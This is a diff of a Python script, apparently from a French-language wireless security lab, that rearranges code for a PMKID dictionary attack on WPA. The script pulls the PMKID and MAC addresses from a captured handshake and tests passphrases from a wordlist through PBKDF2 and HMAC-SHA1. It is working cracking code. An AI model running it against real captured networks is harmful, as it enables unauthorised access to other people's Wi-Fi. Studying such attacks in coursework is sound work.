@@ -41,80 +41,76 @@ def customPRF512(key,A,B):
         R = R+hmacsha1.digest()
     return R[:blen]
 
-def main():
-     # Valeur du key info pour le premier message du handshake
-    FIRST_MESSAGE = 0x008a
-    #Constante présente dans le PMKID
-    pmkName = b"PMK Name"
+ # Valeur du key info pour le premier message du handshake
+FIRST_MESSAGE = 0x008a
+#Constante présente dans le PMKID
+pmkName = b"PMK Name"
 
-    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
-    pmkid=rdpcap("PMKID_handshake.pcap")
+# Read capture file -- it contains beacon, authentication, associacion, handshake and data
+pmkid=rdpcap("PMKID_handshake.pcap")
 
-    #Trouvé en explorant le pcap
-    Ssid = b"Sunrise_2.4GHz_DD4B90"
+#Trouvé en explorant le pcap
+Ssid = b"Sunrise_2.4GHz_DD4B90"
 
-    # On effectue un filtre sur l'argument packets, on créé une liste ne contenant que les packets correspondant à un beacon contenant le SSID cherché
-    list_Beacon = []
-    for packet in pmkid:
-        if packet.haslayer(Dot11AssoReq) and packet.info == Ssid:
-            list_Beacon.append(packet)
+# On effectue un filtre sur les packets, on créé une liste ne contenant que les packets correspondant à un beacon contenant le SSID cherché
+list_Beacon = []
+for packet in pmkid:
+    if packet.haslayer(Dot11AssoReq) and packet.info == Ssid:
+        list_Beacon.append(packet)
 
-    # On sélectionne le premier élément de la liste, et on en extrait les données requises
-    beacon = list_Beacon[0]
+# On sélectionne le premier élément de la liste, et on en extrait les données requises
+beacon = list_Beacon[0]
 
-    # On récupère l'adresse MAC
-    APmac = a2b_hex((beacon.addr1).replace(":", ""))
+# On récupère l'adresse MAC
+APmac = a2b_hex((beacon.addr1).replace(":", ""))
 
-    # On effectue un filtre sur l'argument packets, on créé une list ne contenant que les packets correspondant à un 4WHS
-    list_Handshakes = []
+# On effectue un filtre sur les packets, on créé une list ne contenant que les packets correspondant à un 4WHS
+list_Handshakes = []
 
-    # On parcourt les paquets en cherchant le premier message d'un handshake provenant de notre AP
-    for handshake in pmkid:
-        # apm = a2b_hex((handshake.addr2).replace(':',''))
-        if handshake.haslayer(WPA_key) and handshake.getlayer(WPA_key).key_info == FIRST_MESSAGE and a2b_hex(
-                (handshake.addr2).replace(':', '')) == APmac:
-            list_Handshakes.append(handshake)
+# On parcourt les packets en cherchant le premier message d'un handshake provenant de notre AP
+for handshake in pmkid:
+    # apm = a2b_hex((handshake.addr2).replace(':',''))
+    if handshake.haslayer(WPA_key) and handshake.getlayer(WPA_key).key_info == FIRST_MESSAGE and a2b_hex(
+            (handshake.addr2).replace(':', '')) == APmac:
+        list_Handshakes.append(handshake)
 
-    # On récupère le premier message du handshake contenant le pmkid
-    message1of4 = list_Handshakes[0].getlayer(WPA_key)
-    # On récupère le mac du client
-    Clientmac = a2b_hex((list_Handshakes[0].addr1).replace(":", ""))
-    # On récupère les 16 derniers bytes qui correspondent au pmkid
-    pmkid = message1of4.wpa_key[-16:]
+# On récupère le premier message du handshake contenant le pmkid
+message1of4 = list_Handshakes[0].getlayer(WPA_key)
+# On récupère le mac du client
+Clientmac = a2b_hex((list_Handshakes[0].addr1).replace(":", ""))
+# On récupère les 16 derniers bytes qui correspondent au pmkid
+pmkid = message1of4.wpa_key[-16:]
 
 
-    # Important parameters for key derivation - most of them can be obtained from the pcap file
-    passPhrase  = "actuelle"
-    A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-    # Authenticator and Supplicant Nonces
-    # This is the MIC contained in the 4th frame of the 4-way handshake
-    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
+# Important parameters for key derivation - most of them can be obtained from the pcap file
+passPhrase  = "actuelle"
+A           = "Pairwise key expansion" #this string is used in the pseudo-random function
+# Authenticator and Supplicant Nonces
+# This is the MIC contained in the 4th frame of the 4-way handshake
+# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
 
-    print ("\n\nValues used to derivate keys")
-    print ("============================")
-    print ("Passphrase: ",passPhrase,"\n")
-    print ("SSID: ",Ssid,"\n")
-    print ("AP Mac: ",b2a_hex(APmac),"\n")
-    print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
-    print ("PMKID:" , b2a_hex(pmkid), "\n")
-    wordlist = open('wordlist.txt', 'r')
-    #On lit chaque ligne (passphrase) du fichier un à un et on en tire les clés + MIC
-    for line in wordlist.readlines():
-        
-        #Encode passphrase read in file
-        passPhrase = str.encode(line)
+print ("\n\nValues used to derivate keys")
+print ("============================")
+print ("Passphrase: ",passPhrase,"\n")
+print ("SSID: ",Ssid,"\n")
+print ("AP Mac: ",b2a_hex(APmac),"\n")
+print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
+print ("PMKID:" , b2a_hex(pmkid), "\n")
+wordlist = open('wordlist.txt', 'r')
+#On lit chaque ligne (passphrase) du fichier un à un et on en tire les clés + MIC
+for line in wordlist.readlines():
 
-        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-        pmk = pbkdf2(hashlib.sha1,passPhrase, Ssid, 4096, 32)
+    #Encode passphrase read in file
+    passPhrase = str.encode(line)
 
-        #Calculate PMKID with calculated pmk and concatenation of mac adresses and constants
-        pmkid_test = hmac.new(pmk, pmkName + APmac + Clientmac, hashlib.sha1)
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    pmk = pbkdf2(hashlib.sha1,passPhrase, Ssid, 4096, 32)
 
-        #On doit uniquement prendre les 16 premiers bit, et pas les 20 fournis par la fonction hmac
-        if pmkid == pmkid_test.digest()[:16]:
-            print("The passphrase has been found ! Passphrase : ", passPhrase)
-        else:
-            print("The passphrase is incorrect : ", passPhrase)
+    #Calculate PMKID with calculated pmk and concatenation of mac adresses and constants
+    pmkid_test = hmac.new(pmk, pmkName + APmac + Clientmac, hashlib.sha1)
 
-if __name__ == "__main__":
-    main()
+    #On doit uniquement prendre les 16 premiers bit, et pas les 20 fournis par la fonction hmac
+    if pmkid == pmkid_test.digest()[:16]:
+        print("The passphrase has been found ! Passphrase : ", passPhrase)
+    else:
+        print("The passphrase is incorrect : ", passPhrase)
